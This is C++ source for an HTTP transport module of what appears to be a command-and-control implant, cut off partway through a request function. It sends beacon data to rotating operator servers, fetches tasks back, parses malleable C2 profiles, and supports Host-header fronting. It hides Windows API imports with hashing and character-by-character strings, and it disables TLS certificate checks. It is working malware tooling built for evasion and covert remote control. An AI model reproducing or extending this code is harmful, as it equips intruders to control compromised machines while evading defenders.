#include "ConnectorHTTP.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "ProcLoader.h"
#include "Encoders.h"
#include "Crypt.h"
#include "utils.h"
#include "openmalleable.h"


BOOL _isdigest(char c)
{
	return c >= '0' && c <= '9';
}

int _atoi(const char* str)
{
	int result = 0;
	int sign = 1;
	int index = 0;

	while (str[index] == ' ')
		index++;

	if (str[index] == '-' || str[index] == '+') {
		sign = (str[index] == '-') ? -1 : 1;
		index++;
	}

	while (_isdigest(str[index])) {
		int digit = str[index] - '0';
		if (result > (INT_MAX - digit) / 10)
			return (sign == 1) ? INT_MAX : INT_MIN;

		result = result * 10 + digit;
		index++;
	}
	return result * sign;
}


void* ConnectorHTTP::operator new(size_t sz)
{
	void* p = MemAllocLocal(sz);
	return p;
}

void ConnectorHTTP::operator delete(void* p) noexcept
{
	MemFreeLocal(&p, sizeof(ConnectorHTTP));
}

ConnectorHTTP::ConnectorHTTP()
{
	this->functions = (HTTPFUNC*) ApiWin->LocalAlloc(LPTR, sizeof(HTTPFUNC));

	this->functions->LocalAlloc   = ApiWin->LocalAlloc;
	this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
	this->functions->LocalFree    = ApiWin->LocalFree;
	this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
	this->functions->GetProcAddress = ApiWin->GetProcAddress;
	this->functions->GetLastError = ApiWin->GetLastError;

#if defined(API_RESOLUTION_GETPROCADDRESS)
	CHAR wininet_c[12];
	wininet_c[0]  = HdChrA('w');
	wininet_c[1]  = HdChrA('i');
	wininet_c[2]  = HdChrA('n');
	wininet_c[3]  = HdChrA('i');
	wininet_c[4]  = HdChrA('n');
	wininet_c[5]  = HdChrA('e');
	wininet_c[6]  = HdChrA('t');
	wininet_c[7]  = HdChrA('.');
	wininet_c[8]  = HdChrA('d');
	wininet_c[9]  = HdChrA('l');
	wininet_c[10] = HdChrA('l');
	wininet_c[11] = HdChrA(0);

	HMODULE hWininetModule = this->functions->LoadLibraryA(wininet_c);
	if (hWininetModule) {
		this->functions->InternetOpenA              = (decltype(InternetOpenA)*)              this->functions->GetProcAddress(hWininetModule, "InternetOpenA");
		this->functions->InternetConnectA           = (decltype(InternetConnectA)*)           this->functions->GetProcAddress(hWininetModule, "InternetConnectA");
		this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           this->functions->GetProcAddress(hWininetModule, "HttpOpenRequestA");
		this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)           this->functions->GetProcAddress(hWininetModule, "HttpSendRequestA");
		this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)         this->functions->GetProcAddress(hWininetModule, "InternetSetOptionA");
		this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       this->functions->GetProcAddress(hWininetModule, "InternetQueryOptionA");
		this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)             this->functions->GetProcAddress(hWininetModule, "HttpQueryInfoA");
		this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) this->functions->GetProcAddress(hWininetModule, "InternetQueryDataAvailable");
		this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)        this->functions->GetProcAddress(hWininetModule, "InternetCloseHandle");
		this->functions->InternetReadFile           = (decltype(InternetReadFile)*)           this->functions->GetProcAddress(hWininetModule, "InternetReadFile");
	}
#elif !defined(IAT_HIDING)
	this->functions->InternetOpenA              = InternetOpenA;
	this->functions->InternetConnectA           = InternetConnectA;
	this->functions->HttpOpenRequestA           = HttpOpenRequestA;
	this->functions->HttpSendRequestA           = HttpSendRequestA;
	this->functions->InternetSetOptionA         = InternetSetOptionA;
	this->functions->InternetQueryOptionA       = InternetQueryOptionA;
	this->functions->HttpQueryInfoA             = HttpQueryInfoA;
	this->functions->InternetQueryDataAvailable = InternetQueryDataAvailable;
	this->functions->InternetCloseHandle        = InternetCloseHandle;
	this->functions->InternetReadFile           = InternetReadFile;
#else
	CHAR wininet_c[12];
	wininet_c[0]  = HdChrA('w');
	wininet_c[1]  = HdChrA('i');
	wininet_c[2]  = HdChrA('n');
	wininet_c[3]  = HdChrA('i');
	wininet_c[4]  = HdChrA('n');
	wininet_c[5]  = HdChrA('e');
	wininet_c[6]  = HdChrA('t');
	wininet_c[7]  = HdChrA('.');
	wininet_c[8]  = HdChrA('d');
	wininet_c[9]  = HdChrA('l');
	wininet_c[10] = HdChrA('l');
	wininet_c[11] = HdChrA(0);

	HMODULE hWininetModule = this->functions->LoadLibraryA(wininet_c);
	if (hWininetModule) {
		this->functions->InternetOpenA              = (decltype(InternetOpenA)*)              GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETOPENA);
		this->functions->InternetConnectA           = (decltype(InternetConnectA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCONNECTA);
		this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPOPENREQUESTA);
		this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
		this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)         GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETSETOPTIONA);
		this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYOPTIONA);
		this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)             GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPQUERYINFOA);
		this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
		this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)        GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCLOSEHANDLE);
		this->functions->InternetReadFile           = (decltype(InternetReadFile)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETREADFILE);
	}
#endif
}

BOOL ConnectorHTTP::SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize)
{
	ProfileHTTP profile = *(ProfileHTTP*)profilePtr;

	this->beat_size = beatSize;
	this->beat_data = (BYTE*)this->functions->LocalAlloc(LPTR, beatSize);
	if (!this->beat_data)
		return FALSE;
	memcpy(this->beat_data, beat, beatSize);

	this->server_count   = profile.servers_count;
	this->server_address = (CHAR**)profile.servers;
	this->server_ports   = profile.ports;
	this->ssl            = profile.use_ssl;
	this->hh_count       = profile.hh_count;
	this->host_headers   = (CHAR**)profile.host_headers;
	this->rotation_mode  = profile.rotation_mode;
	this->proxy_type     = profile.proxy_type;
	this->proxy_username = (CHAR*)profile.proxy_username;
	this->proxy_password = (CHAR*)profile.proxy_password;

	if (profile.malleable_profile_text && profile.malleable_profile_text[0]) {
		this->m_profile = malleable_profile_parse((const char*)profile.malleable_profile_text);
		if (!this->m_profile)
			return FALSE;
		this->use_malleable = TRUE;
	} else {
		this->use_malleable = FALSE;
		this->m_profile = NULL;

		LPSTR encBeat = b64_encode(beat, beatSize);

		ULONG enc_beat_length = StrLenA(encBeat);
		ULONG param_length    = StrLenA((CHAR*)profile.parameter);
		ULONG headers_length  = StrLenA((CHAR*)profile.http_headers);

		CHAR* HttpHeaders = (CHAR*)this->functions->LocalAlloc(LPTR, param_length + enc_beat_length + headers_length + 5);
		memcpy(HttpHeaders, profile.http_headers, headers_length);
		ULONG index = headers_length;
		memcpy(HttpHeaders + index, profile.parameter, param_length);
		index += param_length;
		HttpHeaders[index++] = ':';
		HttpHeaders[index++] = ' ';
		memcpy(HttpHeaders + index, encBeat, enc_beat_length);
		index += enc_beat_length;
		HttpHeaders[index++] = '\r';
		HttpHeaders[index++] = '\n';
		HttpHeaders[index++] = 0;

		memset(encBeat, 0, enc_beat_length);
		this->functions->LocalFree(encBeat);

		this->headers        = HttpHeaders;
		this->http_method    = (CHAR*)profile.http_method;
		this->uri_count      = profile.uri_count;
		this->uris           = (CHAR**) profile.uris;
		this->ua_count       = profile.ua_count;
		this->user_agents    = (CHAR**) profile.user_agents;
		this->ans_size       = profile.ans_size;
		this->ans_pre_size   = profile.ans_pre_size;
	}

	if (this->proxy_type != PROXY_TYPE_NONE && profile.proxy_host != NULL) {
		ULONG hostLen = StrLenA((CHAR*)profile.proxy_host);
		WORD port = profile.proxy_port;
		CHAR portStr[6];
		int portIdx = 0;
		if (port == 0) {
			portStr[portIdx++] = '0';
		}
		else {
			CHAR temp[6];
			int tempIdx = 0;
			while (port > 0) {
				temp[tempIdx++] = '0' + (port % 10);
				port /= 10;
			}
			for (int i = tempIdx - 1; i >= 0; i--) {
				portStr[portIdx++] = temp[i];
			}
		}
		portStr[portIdx] = 0;

		ULONG prefixLen = 0;
		if (this->proxy_type == PROXY_TYPE_HTTPS) {
			prefixLen = 8;
		}
		this->proxy_url = (CHAR*)this->functions->LocalAlloc(LPTR, prefixLen + hostLen + 1 + portIdx + 1);
		ULONG idx = 0;
		if (this->proxy_type == PROXY_TYPE_HTTPS) {
			this->proxy_url[idx++] = 'h';
			this->proxy_url[idx++] = 't';
			this->proxy_url[idx++] = 't';
			this->proxy_url[idx++] = 'p';
			this->proxy_url[idx++] = 's';
			this->proxy_url[idx++] = ':';
			this->proxy_url[idx++] = '/';
			this->proxy_url[idx++] = '/';
		}
		memcpy(this->proxy_url + idx, profile.proxy_host, hostLen);
		idx += hostLen;
		this->proxy_url[idx++] = ':';
		memcpy(this->proxy_url + idx, portStr, portIdx + 1);
	}

	return TRUE;
}

void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
{
	if (this->use_malleable) {
		SendDataMalleable(data, data_size);
		return;
	}
	SendDataLegacy(data, data_size);
}

void ConnectorHTTP::RotateIndices()
{
	if (this->rotation_mode == 1) {
		if (!this->use_malleable) {
			this->uri_index = GenerateRandom32() % this->uri_count;
			this->ua_index = GenerateRandom32() % this->ua_count;
		}
		this->server_index = GenerateRandom32() % this->server_count;
		if (this->hh_count > 0)
			this->hh_index = GenerateRandom32() % this->hh_count;
	} else {
		if (!this->use_malleable) {
			this->uri_index = (this->uri_index + 1) % this->uri_count;
			this->ua_index = (this->ua_index + 1) % this->ua_count;
		}
		this->server_index = (this->server_index + 1) % this->server_count;
		if (this->hh_count > 0)
			this->hh_index = (this->hh_index + 1) % this->hh_count;
	}
}

BOOL ConnectorHTTP::ReadHttpResponse(HINTERNET hRequest, void* respPtr)
{
	malleable_http_response_t* resp = (malleable_http_response_t*)respPtr;
	char statusCode[255];
	DWORD statusCodeLength = 255;
	if (!this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE, statusCode, &statusCodeLength, 0))
		return FALSE;
	if (_atoi(statusCode) != 200)
		return FALSE;

	resp->status_code = 200;

	DWORD rawSize = 0;
	this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, NULL, &rawSize, NULL);
	if (rawSize > 0) {
		CHAR* rawHeaders = (CHAR*)this->functions->LocalAlloc(LPTR, rawSize + 1);
		if (rawHeaders) {
			if (this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, rawHeaders, &rawSize, NULL)) {
				CHAR* cursor = rawHeaders;
				while (*cursor) {
					CHAR* lineEnd = cursor;
					while (*lineEnd && *lineEnd != '\r' && *lineEnd != '\n')
						lineEnd++;
					ULONG lineLen = (ULONG)(lineEnd - cursor);
					if (lineLen > 0 && StrChrA(cursor, ':')) {
						CHAR* lineCopy = (CHAR*)this->functions->LocalAlloc(LPTR, lineLen + 1);
						if (lineCopy) {
							memcpy(lineCopy, cursor, lineLen);
							lineCopy[lineLen] = 0;
							resp->num_headers++;
							char** newHeaders = NULL;
							if (resp->headers) {
								newHeaders = (char**)this->functions->LocalReAlloc(resp->headers, resp->num_headers * sizeof(char*), LMEM_MOVEABLE);
							}
							else {
								newHeaders = (char**)this->functions->LocalAlloc(LPTR, resp->num_headers * sizeof(char*));
							}

							if (newHeaders) {
								resp->headers = newHeaders;
								resp->headers[resp->num_headers - 1] = lineCopy;
							}
							else {
								resp->num_headers--;
								this->functions->LocalFree(lineCopy);
							}
						}
					}
					cursor = lineEnd;
					while (*cursor == '\r' || *cursor == '\n')
						cursor++;
				}
			}
			this->functions->LocalFree(rawHeaders);
		}
	}

	ULONG numberReadBytes = 0;
	DWORD readedBytes = 0;
	DWORD dwNumberOfBytesAvailable = 0;
	BYTE* buffer = NULL;

	while (1) {
		if (!this->functions->InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0))
			break;
		if (!dwNumberOfBytesAvailable)
			break;

		if (buffer) {
			BYTE* resized = (BYTE*)this->functions->LocalReAlloc(buffer, numberReadBytes + dwNumberOfBytesAvailable, LMEM_MOVEABLE);
			if (!resized)
				break;
			buffer = resized;
		}
		else {
			buffer = (BYTE*)this->functions->LocalAlloc(LPTR, numberReadBytes + dwNumberOfBytesAvailable);
		}
		if (!buffer)
			break;

		if (!this->functions->InternetReadFile(hRequest, buffer + numberReadBytes, dwNumberOfBytesAvailable, &readedBytes))
			break;
		if (!readedBytes)
			break;

		numberReadBytes += readedBytes;
	}

	resp->body = buffer;
	resp->body_len = numberReadBytes;
	if (numberReadBytes == 0 && buffer) {
		this->functions->LocalFree(buffer);
		resp->body = NULL;
	}
	return TRUE;
}

static void FreeMalleableResponse(malleable_http_response_t* resp, HTTPFUNC* functions)
{
	if (!resp)
		return;
	if (resp->headers) {
		for (size_t i = 0; i < resp->num_headers; i++) {
			if (resp->headers[i])
				functions->LocalFree(resp->headers[i]);
		}
		functions->LocalFree(resp->headers);
	}
	if (resp->body)
		functions->LocalFree(resp->body);
	resp->headers = NULL;
	resp->body = NULL;
	resp->num_headers = 0;
	resp->body_len = 0;
}

static void IgnoreTlsCertificateErrors(HINTERNET hHandle, HTTPFUNC* functions)
{
	if (!hHandle || !functions || !functions->InternetSetOptionA)
		return;

	DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
	              SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
	              SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
	              SECURITY_FLAG_IGNORE_REVOCATION |
	              SECURITY_FLAG_IGNORE_WRONG_USAGE |
	              SECURITY_FLAG_IGNORE_WEAK_SIGNATURE;
	functions->InternetSetOptionA(hHandle, INTERNET_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
}

void ConnectorHTTP::SendDataMalleable(BYTE* data, ULONG data_size)
{
	this->recvSize = 0;
	this->recvData = 0;

	if (!this->m_profile || !this->beat_data || !this->beat_size)
		return;

	malleable_profile_t* profile = (malleable_profile_t*)this->m_profile;
	malleable_http_request_t* request = NULL;
	malleable_error_t buildErr;
	BOOL isPost = (data != NULL && data_size > 0);

	if (isPost) {
		buildErr = malleable_build_post_request(profile, NULL, this->beat_data, this->beat_size, data, data_size, &request);
	} else {
		buildErr = malleable_build_get_request(profile, NULL, this->beat_data, this->beat_size, &request);
	}

	if (buildErr != MALLEABLE_SUCCESS || !request)
		return;

	ULONG attempt = 0;
	BOOL connected = FALSE;
	DWORD context = 0;

	if (this->hConnect) {
		this->functions->InternetCloseHandle(this->hConnect);
		this->hConnect = NULL;
	}
	if (this->hInternet) {
		this->functions->InternetCloseHandle(this->hInternet);
		this->hInternet = NULL;
	}

	while (!connected && attempt < this->server_count) {
		const char* userAgent = (profile->useragent && profile->useragent[0]) ? profile->useragent : "Mozilla/5.0";

		if (!this->hInternet) {
				if (this->proxy_url != NULL) {
					this->hInternet = this->functions->InternetOpenA((CHAR*)userAgent, INTERNET_OPEN_TYPE_PROXY, this->proxy_url, NULL, 0);
				} else {
					this->hInternet = this->functions->InternetOpenA((CHAR*)userAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
				}
				if (this->ssl)
					IgnoreTlsCertificateErrors(this->hInternet, this->functions);
			}

			if (this->hInternet) {
				if (!this->hConnect) {
					this->hConnect = this->functions->InternetConnectA(this->hInternet, this->server_address[this->server_index], this->server_ports[this->server_index], NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context);
					if (this->ssl)
						IgnoreTlsCertificateErrors(this->hConnect, this->functions);
				}

			if (this->hConnect) {
				CHAR acceptTypes[] = { '*', '/', '*', 0 };
				LPCSTR rgpszAcceptTypes[] = { acceptTypes, 0 };
					DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES;
					if (this->ssl)
						flags |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;

					HINTERNET hRequest = this->functions->HttpOpenRequestA(this->hConnect, request->method, request->uri, 0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context);
					if (hRequest) {
						if (this->ssl) {
							IgnoreTlsCertificateErrors(hRequest, this->functions);
							DWORD dwFlags = 0;
							DWORD dwBuffer = sizeof(DWORD);
						this->functions->InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffer);
						dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION | SECURITY_FLAG_IGNORE_WRONG_USAGE;
						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
					}

					if (this->proxy_type != PROXY_TYPE_NONE && this->proxy_username != NULL) {
						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_USERNAME, this->proxy_username, StrLenA(this->proxy_username));
						if (this->proxy_password != NULL) {
							this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_PASSWORD, this->proxy_password, StrLenA(this->proxy_password));
						}
					}

					ULONG headersLen = 0;
					for (size_t i = 0; i < request->num_headers; i++) {
						headersLen += StrLenA(request->headers[i]) + 2;
					}

					CHAR* reqHeaders = (CHAR*)this->functions->LocalAlloc(LPTR, headersLen + 1);
					ULONG off = 0;
					for (size_t i = 0; i < request->num_headers; i++) {
						ULONG hLen = StrLenA(request->headers[i]);
						memcpy(reqHeaders + off, request->headers[i], hLen);
						off += hLen;
						reqHeaders[off++] = '\r';
						reqHeaders[off++] = '\n';
					}
					reqHeaders[off] = 0;

					CHAR* tmpHeaders = NULL;
					if (this->hh_count > 0) {
						CHAR* currentHH = this->host_headers[this->hh_index];
						ULONG hhLen = StrLenA(currentHH);
						ULONG baseLen = off;
						WORD currentPort = this->server_ports[this->server_index];

						BOOL hasPort = FALSE;
						for (ULONG i = 0; i < hhLen; i++) {
							if (currentHH[i] == ':') {
								hasPort = TRUE;
								break;
							}
						}

						BOOL needPort = FALSE;
						CHAR portStr[6] = {0};
						ULONG portLen = 0;
						if (!hasPort) {
							if ((this->ssl && currentPort != 443) || (!this->ssl && currentPort != 80)) {
								needPort = TRUE;
								WORD port = currentPort;
								if (port == 0) {
									portStr[portLen++] = '0';
								} else {
									CHAR temp[6];
									int tempIdx = 0;
									while (port > 0) {
										temp[tempIdx++] = '0' + (port % 10);
										port /= 10;
									}
									for (int i = tempIdx - 1; i >= 0; i--) {
										portStr[portLen++] = temp[i];
									}
								}
								portStr[portLen] = 0;
							}
						}

						ULONG allocSize = 6 + hhLen + (needPort ? 1 + portLen : 0) + 2 + baseLen + 1;
						tmpHeaders = (CHAR*)this->functions->LocalAlloc(LPTR, allocSize);
						ULONG hoff = 0;
						tmpHeaders[hoff++] = 'H'; tmpHeaders[hoff++] = 'o'; tmpHeaders[hoff++] = 's';
						tmpHeaders[hoff++] = 't'; tmpHeaders[hoff++] = ':'; tmpHeaders[hoff++] = ' ';
						memcpy(tmpHeaders + hoff, currentHH, hhLen); hoff += hhLen;
						if (needPort) {
							tmpHeaders[hoff++] = ':';
							memcpy(tmpHeaders + hoff, portStr, portLen); hoff += portLen;
						}
						tmpHeaders[hoff++] = '\r'; tmpHeaders[hoff++] = '\n';
						memcpy(tmpHeaders + hoff, reqHeaders, baseLen); hoff += baseLen;
						tmpHeaders[hoff] = 0;
						this->functions->LocalFree(reqHeaders);
						reqHeaders = tmpHeaders;
					}

					connected = this->functions->HttpSendRequestA(hRequest, reqHeaders, (DWORD)StrLenA(reqHeaders), (LPVOID)request->body, (DWORD)request->body_len);

					if (reqHeaders) {
						this->functions->LocalFree(reqHeaders);
					}

					if (connected) {
						malleable_http_response_t resp;
						memset(&resp, 0, sizeof(resp));
						if (ReadHttpResponse(hRequest, &resp)) {
							if (!isPost) {
								uint8_t* tasks = NULL;
								size_t tasks_len = 0;
								const char* variant = malleable_find_variant_for_uri(
									profile->http_get_transactions,
									profile->num_http_get,
									request->uri
								);
								if (malleable_parse_get_response(profile, variant, &resp, &tasks, &tasks_len) == MALLEABLE_SUCCESS && tasks && tasks_len > 0) {
									this->recvData = (BYTE*)this->functions->LocalAlloc(LPTR, (ULONG)tasks_len);
									if (this->recvData) {
										memcpy(this->recvData, tasks, tasks_len);
										this->recvSize = (int)tasks_len;
									}
									memset(tasks, 0, tasks_len);
									free(tasks);
								}
							}
							FreeMalleableResponse(&resp, this->functions);
						}
					}

					this->functions->InternetCloseHandle(hRequest);
				}
			}
		}

		attempt++;
		if (!connected) {
			if (this->hConnect) {
				this->functions->InternetCloseHandle(this->hConnect);
				this->hConnect = NULL;
			}
			if (this->hInternet) {
				this->functions->InternetCloseHandle(this->hInternet);
				this->hInternet = NULL;
			}
			this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
			this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_REFRESH, NULL, 0);
			this->server_index = (this->server_index + 1) % this->server_count;
		}

		RotateIndices();
	}

	malleable_http_request_free(request);
}

void ConnectorHTTP::SendDataLegacy(BYTE* data, ULONG data_size)
{
	this->recvSize = 0;
	this->recvData = 0;

	ULONG attempt = 0;
	BOOL  connected = FALSE;
	BOOL  result = FALSE;
	DWORD context = 0;

	// Close existing handles to force new UA per call
	if (this->hConnect) {
		this->functions->InternetCloseHandle(this->hConnect);
		this->hConnect = NULL;
	}
	if (this->hInternet) {
		this->functions->InternetCloseHandle(this->hInternet);
		this->hInternet = NULL;
	}

	while (!connected && attempt < this->server_count) {
		DWORD dwError = 0;

		if (!this->hInternet) {
			CHAR* currentUA = this->user_agents[this->ua_index];
				if (this->proxy_url != NULL) {
					this->hInternet = this->functions->InternetOpenA(currentUA, INTERNET_OPEN_TYPE_PROXY, this->proxy_url, NULL, 0);
				}
				else {
					this->hInternet = this->functions->InternetOpenA(currentUA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
				}
				if (this->ssl)
					IgnoreTlsCertificateErrors(this->hInternet, this->functions);
			}
			if (this->hInternet) {

				if (!this->hConnect) {
					this->hConnect = this->functions->InternetConnectA(this->hInternet, this->server_address[this->server_index], this->server_ports[this->server_index], NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context);
					if (this->ssl)
						IgnoreTlsCertificateErrors(this->hConnect, this->functions);
				}

			if (this->hConnect)
			{
				CHAR acceptTypes[] = { '*', '/', '*', 0 };
				LPCSTR rgpszAcceptTypes[] = { acceptTypes, 0 };
					DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES;
					if (this->ssl)
						flags |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;

				CHAR* currentUri = this->uris[this->uri_index];
					HINTERNET hRequest = this->functions->HttpOpenRequestA(this->hConnect, this->http_method, currentUri, 0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context);
					if (hRequest) {
						if (this->ssl) {
							IgnoreTlsCertificateErrors(hRequest, this->functions);
							DWORD dwFlags = 0;
						DWORD dwBuffer = sizeof(DWORD);
						result = this->functions->InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffer);
						if (!result) {
							dwFlags = 0;
						}
						dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION | SECURITY_FLAG_IGNORE_WRONG_USAGE;
						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
					}

					if (this->proxy_type != PROXY_TYPE_NONE && this->proxy_username != NULL) {
						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_USERNAME, this->proxy_username, StrLenA(this->proxy_username));
						if (this->proxy_password != NULL) {
							this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_PASSWORD, this->proxy_password, StrLenA(this->proxy_password));
						}
					}

					// Build request headers with optional Host header
					CHAR* reqHeaders = this->headers;
					CHAR* tmpHeaders = NULL;
					if (this->hh_count > 0) {
						CHAR* currentHH = this->host_headers[this->hh_index];
						ULONG hhLen = StrLenA(currentHH);
						ULONG baseLen = StrLenA(this->headers);
						WORD currentPort = this->server_ports[this->server_index];

						BOOL hasPort = FALSE;
						for (ULONG i = 0; i < hhLen; i++) {
							if (currentHH[i] == ':') {
								hasPort = TRUE;
								break;
							}
						}

						BOOL needPort = FALSE;
						CHAR portStr[6] = {0};
						ULONG portLen = 0;
						if (!hasPort) {
							if ((this->ssl && currentPort != 443) || (!this->ssl && currentPort != 80)) {
								needPort = TRUE;
								WORD port = currentPort;
								if (port == 0) {
									portStr[portLen++] = '0';
								} else {
									CHAR temp[6];
									int tempIdx = 0;
									while (port > 0) {
										temp[tempIdx++] = '0' + (port % 10);
										port /= 10;
									}
									for (int i = tempIdx - 1; i >= 0; i--) {
										portStr[portLen++] = temp[i];
									}
								}
								portStr[portLen] = 0;
							}
						}

						ULONG allocSize = 6 + hhLen + (needPort ? 1 + portLen : 0) + 2 + baseLen + 1;
						tmpHeaders = (CHAR*)this->functions->LocalAlloc(LPTR, allocSize);
						ULONG off = 0;
						tmpHeaders[off++] = 'H'; tmpHeaders[off++] = 'o'; tmpHeaders[off++] = 's';
						tmpHeaders[off++] = 't'; tmpHeaders[off++] = ':'; tmpHeaders[off++] = ' ';
						memcpy(tmpHeaders + off, currentHH, hhLen); off += hhLen;
						if (needPort) {
							tmpHeaders[off++] = ':';
							memcpy(tmpHeaders + off, portStr, portLen); off += portLen;
						}
						tmpHeaders[off++] = '\r'; tmpHeaders[off++] = '\n';
						memcpy(tmpHeaders + off, this->headers, baseLen); off += baseLen;
						tmpHeaders[off] = 0;
						reqHeaders = tmpHeaders;
					}

					connected = this->functions->HttpSendRequestA(hRequest, reqHeaders, (DWORD)StrLenA(reqHeaders), (LPVOID)data, (DWORD)data_size);

					if (tmpHeaders) {
						memset(tmpHeaders, 0, StrLenA(tmpHeaders));
						this->functions->LocalFree(tmpHeaders);
					}
					if (connected) {
						char statusCode[255];
						DWORD statusCodeLenght = 255;
						BOOL result = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE, statusCode, &statusCodeLenght, 0);

						if (result && _atoi(statusCode) == 200) {
							DWORD answerSize = 0;
							DWORD dwLengthDataSize = sizeof(DWORD);
							result = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &answerSize, &dwLengthDataSize, NULL);

							if (result) {
								DWORD dwNumberOfBytesAvailable = 0;
								result = this->functions->InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0);

								if (result && answerSize > 0) {
									ULONG numberReadedBytes = 0;
									DWORD readedBytes = 0;
									BYTE* buffer = (BYTE*)this->functions->LocalAlloc(LPTR, answerSize);

									while (numberReadedBytes < answerSize) {
										result = this->functions->InternetReadFile(hRequest, buffer + numberReadedBytes, dwNumberOfBytesAvailable, &readedBytes);
										if (!result || !readedBytes) {
											break;
										}
										numberReadedBytes += readedBytes;
									}
									this->recvSize = numberReadedBytes;
									this->recvData = buffer;
								}
							}
							else if (this->functions->GetLastError() == ERROR_HTTP_HEADER_NOT_FOUND) {
								ULONG numberReadedBytes = 0;
								DWORD readedBytes = 0;
								BYTE* buffer = NULL;
								DWORD dwNumberOfBytesAvailable = 0;

								while (1) {
									result = this->functions->InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0);
									if (!result || !dwNumberOfBytesAvailable)
										break;

									if (buffer) {
										BYTE* resized = (BYTE*)this->functions->LocalReAlloc(buffer, dwNumberOfBytesAvailable + numberReadedBytes, LMEM_MOVEABLE);
										if (!resized)
											break;
										buffer = resized;
									}
									else {
										buffer = (BYTE*)this->functions->LocalAlloc(LPTR, dwNumberOfBytesAvailable + numberReadedBytes);
									}
									if (!buffer)
										break;
									result = this->functions->InternetReadFile(hRequest, buffer + numberReadedBytes, dwNumberOfBytesAvailable, &readedBytes);
									if (!result || !readedBytes) {
										break;
									}
									numberReadedBytes += readedBytes;
								}

								if (numberReadedBytes) {
									this->recvSize = numberReadedBytes;
									this->recvData = buffer;
								}
								else {
									if (buffer)
										this->functions->LocalFree(buffer);
								}
							}
						}
					}
					else {
						dwError = this->functions->GetLastError();
					}
